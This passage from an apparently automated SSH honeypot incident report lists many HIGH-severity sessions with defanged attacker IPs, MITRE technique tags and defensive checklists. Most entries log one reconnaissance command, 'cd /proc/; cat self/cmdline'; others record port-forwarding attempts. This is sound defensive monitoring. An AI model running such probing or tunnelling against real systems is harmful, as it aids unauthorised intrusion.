| `2026-07-10 13:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82bd641876f2

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:38 |
| **Last Seen** | 2026-07-10 13:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:38:26` | `cowrie.session.connect` |
| `2026-07-10 13:38:30` | `cowrie.login.success` |
| `2026-07-10 13:38:30` | `cowrie.session.params` |
| `2026-07-10 13:38:32` | `cowrie.command.input` |
| `2026-07-10 13:38:38` | `cowrie.log.closed` |
| `2026-07-10 13:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca552dedd880

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:38 |
| **Last Seen** | 2026-07-10 13:38 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:38:38` | `cowrie.session.connect` |
| `2026-07-10 13:38:42` | `cowrie.login.success` |
| `2026-07-10 13:38:42` | `cowrie.session.params` |
| `2026-07-10 13:38:44` | `cowrie.command.input` |
| `2026-07-10 13:38:50` | `cowrie.log.closed` |
| `2026-07-10 13:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fef356744e

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:38 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:38:50` | `cowrie.session.connect` |
| `2026-07-10 13:38:56` | `cowrie.login.success` |
| `2026-07-10 13:38:56` | `cowrie.session.params` |
| `2026-07-10 13:38:58` | `cowrie.command.input` |
| `2026-07-10 13:39:04` | `cowrie.log.closed` |
| `2026-07-10 13:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3ab4acf5f7

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:04` | `cowrie.session.connect` |
| `2026-07-10 13:39:08` | `cowrie.login.success` |
| `2026-07-10 13:39:08` | `cowrie.session.params` |
| `2026-07-10 13:39:10` | `cowrie.command.input` |
| `2026-07-10 13:39:16` | `cowrie.log.closed` |
| `2026-07-10 13:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d63be6b88ff

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:16` | `cowrie.session.connect` |
| `2026-07-10 13:39:19` | `cowrie.login.success` |
| `2026-07-10 13:39:20` | `cowrie.session.params` |
| `2026-07-10 13:39:22` | `cowrie.command.input` |
| `2026-07-10 13:39:28` | `cowrie.log.closed` |
| `2026-07-10 13:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-977d15af6e3d

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:28` | `cowrie.session.connect` |
| `2026-07-10 13:39:32` | `cowrie.login.success` |
| `2026-07-10 13:39:33` | `cowrie.session.params` |
| `2026-07-10 13:39:35` | `cowrie.command.input` |
| `2026-07-10 13:39:40` | `cowrie.log.closed` |
| `2026-07-10 13:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50802114616e

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:40` | `cowrie.session.connect` |
| `2026-07-10 13:39:44` | `cowrie.login.success` |
| `2026-07-10 13:39:45` | `cowrie.session.params` |
| `2026-07-10 13:39:47` | `cowrie.command.input` |
| `2026-07-10 13:39:52` | `cowrie.log.closed` |
| `2026-07-10 13:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef8a01b60ffa

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:48` | `cowrie.session.connect` |
| `2026-07-10 13:39:49` | `cowrie.client.version` |
| `2026-07-10 13:39:49` | `cowrie.client.kex` |
| `2026-07-10 13:39:51` | `cowrie.login.success` |
| `2026-07-10 13:39:52` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3cc033228e

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:39 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:39:52` | `cowrie.session.connect` |
| `2026-07-10 13:39:56` | `cowrie.login.success` |
| `2026-07-10 13:39:57` | `cowrie.session.params` |
| `2026-07-10 13:39:59` | `cowrie.command.input` |
| `2026-07-10 13:40:04` | `cowrie.log.closed` |
| `2026-07-10 13:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddeb540306b

| Field | Detail |
|---|---|
| **Source IP** | `128.199.118[.]234` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:01` | `cowrie.session.connect` |
| `2026-07-10 13:40:02` | `cowrie.client.version` |
| `2026-07-10 13:40:02` | `cowrie.client.kex` |
| `2026-07-10 13:40:04` | `cowrie.login.success` |
| `2026-07-10 13:40:05` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.199.118[.]234` to AbuseIPDB if not already reported
- [ ] Block `128.199.118[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-976f5d0bf2e4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:02` | `cowrie.session.connect` |
| `2026-07-10 13:40:02` | `cowrie.client.version` |
| `2026-07-10 13:40:02` | `cowrie.client.kex` |
| `2026-07-10 13:40:03` | `cowrie.login.success` |
| `2026-07-10 13:40:03` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:40:03` | `cowrie.direct-tcpip.data` |
| `2026-07-10 13:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a70f886e9d

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:04` | `cowrie.session.connect` |
| `2026-07-10 13:40:09` | `cowrie.login.success` |
| `2026-07-10 13:40:09` | `cowrie.session.params` |
| `2026-07-10 13:40:12` | `cowrie.command.input` |
| `2026-07-10 13:40:16` | `cowrie.log.closed` |
| `2026-07-10 13:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b4234499db9

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:16` | `cowrie.session.connect` |
| `2026-07-10 13:40:21` | `cowrie.login.success` |
| `2026-07-10 13:40:21` | `cowrie.session.params` |
| `2026-07-10 13:40:24` | `cowrie.command.input` |
| `2026-07-10 13:40:28` | `cowrie.log.closed` |
| `2026-07-10 13:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb1c7f0e9ae

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:28` | `cowrie.session.connect` |
| `2026-07-10 13:40:33` | `cowrie.login.success` |
| `2026-07-10 13:40:34` | `cowrie.session.params` |
| `2026-07-10 13:40:36` | `cowrie.command.input` |
| `2026-07-10 13:40:41` | `cowrie.log.closed` |
| `2026-07-10 13:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e023e9723d

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:41` | `cowrie.session.connect` |
| `2026-07-10 13:40:45` | `cowrie.login.success` |
| `2026-07-10 13:40:46` | `cowrie.session.params` |
| `2026-07-10 13:40:48` | `cowrie.command.input` |
| `2026-07-10 13:40:53` | `cowrie.log.closed` |
| `2026-07-10 13:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059ad13a413e

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:40 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:40:53` | `cowrie.session.connect` |
| `2026-07-10 13:40:58` | `cowrie.login.success` |
| `2026-07-10 13:40:58` | `cowrie.session.params` |
| `2026-07-10 13:41:01` | `cowrie.command.input` |
| `2026-07-10 13:41:05` | `cowrie.log.closed` |
| `2026-07-10 13:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a414c3c4135

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:05` | `cowrie.session.connect` |
| `2026-07-10 13:41:10` | `cowrie.login.success` |
| `2026-07-10 13:41:11` | `cowrie.session.params` |
| `2026-07-10 13:41:14` | `cowrie.command.input` |
| `2026-07-10 13:41:18` | `cowrie.log.closed` |
| `2026-07-10 13:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d25cab182b

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:13` | `cowrie.session.connect` |
| `2026-07-10 13:41:13` | `cowrie.client.version` |
| `2026-07-10 13:41:13` | `cowrie.client.kex` |
| `2026-07-10 13:41:16` | `cowrie.login.success` |
| `2026-07-10 13:41:17` | `cowrie.direct-tcpip.request` |
| `2026-07-10 13:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4c019705f5

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:18` | `cowrie.session.connect` |
| `2026-07-10 13:41:23` | `cowrie.login.success` |
| `2026-07-10 13:41:24` | `cowrie.session.params` |
| `2026-07-10 13:41:26` | `cowrie.command.input` |
| `2026-07-10 13:41:30` | `cowrie.log.closed` |
| `2026-07-10 13:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a314a7e76f99

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:30` | `cowrie.session.connect` |
| `2026-07-10 13:41:35` | `cowrie.login.success` |
| `2026-07-10 13:41:35` | `cowrie.session.params` |
| `2026-07-10 13:41:38` | `cowrie.command.input` |
| `2026-07-10 13:41:43` | `cowrie.log.closed` |
| `2026-07-10 13:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc88c181451

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:43` | `cowrie.session.connect` |
| `2026-07-10 13:41:47` | `cowrie.login.success` |
| `2026-07-10 13:41:48` | `cowrie.session.params` |
| `2026-07-10 13:41:51` | `cowrie.command.input` |
| `2026-07-10 13:41:55` | `cowrie.log.closed` |
| `2026-07-10 13:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b9afb174b6

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:41 |
| **Last Seen** | 2026-07-10 13:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:41:55` | `cowrie.session.connect` |
| `2026-07-10 13:42:00` | `cowrie.login.success` |
| `2026-07-10 13:42:01` | `cowrie.session.params` |
| `2026-07-10 13:42:03` | `cowrie.command.input` |
| `2026-07-10 13:42:08` | `cowrie.log.closed` |
| `2026-07-10 13:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83753dc0977

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:42 |
| **Last Seen** | 2026-07-10 13:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:42:16` | `cowrie.session.connect` |
| `2026-07-10 13:42:21` | `cowrie.login.success` |
| `2026-07-10 13:42:22` | `cowrie.session.params` |
| `2026-07-10 13:42:24` | `cowrie.command.input` |
| `2026-07-10 13:42:28` | `cowrie.log.closed` |
| `2026-07-10 13:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c3c35c9698

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:42 |
| **Last Seen** | 2026-07-10 13:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:42:28` | `cowrie.session.connect` |
| `2026-07-10 13:42:33` | `cowrie.login.success` |
| `2026-07-10 13:42:34` | `cowrie.session.params` |
| `2026-07-10 13:42:37` | `cowrie.command.input` |
| `2026-07-10 13:42:41` | `cowrie.log.closed` |
| `2026-07-10 13:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d677f1b2dc

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:42 |
| **Last Seen** | 2026-07-10 13:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:42:41` | `cowrie.session.connect` |
| `2026-07-10 13:42:46` | `cowrie.login.success` |
| `2026-07-10 13:42:46` | `cowrie.session.params` |
| `2026-07-10 13:42:49` | `cowrie.command.input` |
| `2026-07-10 13:42:53` | `cowrie.log.closed` |
| `2026-07-10 13:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819bc83b0abe

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:42 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:42:53` | `cowrie.session.connect` |
| `2026-07-10 13:42:59` | `cowrie.login.success` |
| `2026-07-10 13:42:59` | `cowrie.session.params` |
| `2026-07-10 13:43:02` | `cowrie.command.input` |
| `2026-07-10 13:43:06` | `cowrie.log.closed` |
| `2026-07-10 13:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0e04b9ea40f

| Field | Detail |
|---|---|
| **Source IP** | `104.194.10[.]143` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /proc/; cat self/cmdline` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:43:06` | `cowrie.session.connect` |
| `2026-07-10 13:43:12` | `cowrie.login.success` |
| `2026-07-10 13:43:13` | `cowrie.session.params` |
| `2026-07-10 13:43:16` | `cowrie.command.input` |
| `2026-07-10 13:43:19` | `cowrie.log.closed` |
| `2026-07-10 13:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.194.10[.]143` to AbuseIPDB if not already reported
- [ ] Block `104.194.10[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f8e5bad452e

| Field | Detail |
|---|---|
| **Source IP** | `45.118.49[.]18` |
| **First Seen** | 2026-07-10 13:43 |
| **Last Seen** | 2026-07-10 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
